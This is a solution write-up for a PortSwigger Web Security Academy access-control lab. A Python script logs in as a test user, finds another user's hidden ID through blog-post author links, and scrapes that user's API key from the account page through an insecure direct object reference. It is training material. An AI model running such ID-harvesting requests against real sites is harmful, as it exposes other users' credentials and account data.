# Lab: User ID controlled by request parameter, with unpredictable user IDs

Link to lab: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a98006803cffa05c2f9c03600950036.web-security-academy.net/'

session = requests.Session()

response = session.get(
    url + 'login',
    verify=False,
)


soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    "csrf": csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + 'login',
    data=data,
    verify=False,   
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

for i in range(11):

    params = {
        'postId': i,
    }  

    response = requests.get(
        url + 'post',
        params=params,
        cookies=cookies,
        verify=False,
    )
    if "carlos" in response.text:
        break

soup = BeautifulSoup(response.text, 'html.parser')
user_id = soup.find('span', {'id': 'blog-author'}).find('a')['href'].split('=')[1]

params = {
    'id': user_id,
}
response = requests.get(
    url + 'my-account',
    params=params,
    verify= False,
)

pattern = r'\b\w{32}\b'
match = re.search(pattern, response.text).group()


data = {
    'answer': match,
}

response = requests.post(
    url + 'submitSolution',
    cookies=cookies,
    data=data,
    verify=False,
)
print(response.text)
```